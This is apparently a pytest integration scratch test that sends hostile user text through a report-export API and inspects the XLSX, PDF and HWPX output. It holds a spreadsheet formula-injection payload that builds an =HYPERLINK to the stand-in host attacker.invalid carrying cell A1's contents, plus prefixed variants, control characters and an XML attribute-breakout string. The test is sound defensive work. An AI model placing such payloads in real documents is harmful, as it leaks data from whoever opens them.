"""Scratch: end-to-end report export with hostile / control-character user text (real app, moto S3)."""
from __future__ import annotations
import io, re, zipfile
import pytest
from sqlalchemy import update
from app.db.models import Organization, Project, TrialSession
from app.seed import ORG_A, PRJ_A, SES_A

pytestmark = pytest.mark.integration
MEMBER, ADMIN, OP = 102, 101, 106


def sheet_xml(data: bytes) -> str:
    z = zipfile.ZipFile(io.BytesIO(data))
    return "".join(z.read(n).decode() for n in z.namelist() if n.startswith("xl/worksheets/sheet"))


def test_reports_end_to_end(ictx):
    hm, ho = ictx.as_user(MEMBER), ictx.as_user(OP)
    HOSTILE = '=HYPERLINK("http://attacker.invalid/?x="&A1,"click")'
    with ictx.c.sessionmaker.begin() as db:
        db.execute(update(Organization).where(Organization.organization_id == ORG_A).values(name=HOSTILE))
        db.execute(update(Project).where(Project.project_id == PRJ_A).values(name="+" + HOSTILE))
        db.execute(update(TrialSession).where(TrialSession.session_id == SES_A).values(title="@" + HOSTILE, site="-" + HOSTILE))
    r = ictx.client.post(f"/v1/sessions/{SES_A}/records", headers=hm, json={"kind": "TEST", "title": HOSTILE, "test_item": "\t" + HOSTILE, "conditions": "\r" + HOSTILE, "result": "=1+1"})
    print("create record ->", r.status_code)
    rid = r.json()["record_id"]
    r = ictx.client.post(f"/v1/records/{rid}/approve", headers=ictx.as_user(ADMIN)); print("approve record ->", r.status_code)
    r = ictx.client.post("/v1/reports", json={"template_code": "EXAMPLE_SESSION_LOG", "session_id": SES_A, "title": HOSTILE}, headers=hm)
    print("create report ->", r.status_code)
    rep = r.json(); path = f"/v1/reports/{rep['report_id']}"
    r = ictx.client.patch(path + "/fields", json={"fields": [{"key": "summary", "value": "-2+3 " + HOSTILE}, {"key": "issues", "value": HOSTILE}]}, headers=hm)
    print("patch fields ->", r.status_code)
    r = ictx.client.get(path + "/export", params={"format": "XLSX"}, headers=hm)
    x = sheet_xml(r.content)
    print("XLSX export ->", r.status_code, "formula nodes:", len(re.findall(r"<f[ >/]", x)), "| contains hostile text as inline string:", HOSTILE.replace('"', "&quot;") in x or HOSTILE in x)
    # --- control characters in editable fields (no filter on the API models)
    for name, ch in [("VT \\x0b", "\x0b"), ("ESC \\x1b", "\x1b"), ("SOH \\x01", "\x01"), ("U+FFFE", "￾")]:
        r = ictx.client.patch(path + "/fields", json={"fields": [{"key": "issues", "value": f"a{ch}b"}]}, headers=hm)
        st_patch = r.status_code
        rx = ictx.client.get(path + "/export", params={"format": "XLSX"}, headers=hm)
        rp = ictx.client.get(path + "/export", params={"format": "PDF"}, headers=hm)
        print(f"control char {name}: PATCH={st_patch}  export XLSX={rx.status_code}  export PDF={rp.status_code}")
    # reset field to normal so we can upload a HWPX template and see the corrupt output
    # HWPX template with placeholder in text and attribute positions
    tpl = io.BytesIO()
    with zipfile.ZipFile(tpl, "w") as zf:
        zf.writestr("Contents/section0.xml", '<sec><p a="{{field.issues}}">{{field.issues}}</p></sec>')
    r = ictx.client.put("/v1/report-templates/EXAMPLE_SESSION_LOG/versions/1/hwpx", content=tpl.getvalue(), headers={**ho, "Content-Type": "application/octet-stream"})
    print("put hwpx template ->", r.status_code)
    from xml.dom import minidom
    for label, val in [("VT in value", "a\x0bb"), ("dq in attribute", 'x" onmouseover="1')]:
        ictx.client.patch(path + "/fields", json={"fields": [{"key": "issues", "value": val}]}, headers=hm)
        rh = ictx.client.get(path + "/export", params={"format": "HWPX"}, headers=hm)
        xml = zipfile.ZipFile(io.BytesIO(rh.content)).read("Contents/section0.xml")
        try:
            d = minidom.parseString(xml); p = d.getElementsByTagName("p")[0]
            print(f"HWPX [{label}] export={rh.status_code} well-formed attrs={dict(p.attributes.items())}")
        except Exception as e:
            print(f"HWPX [{label}] export={rh.status_code} NOT WELL-FORMED: {type(e).__name__}")
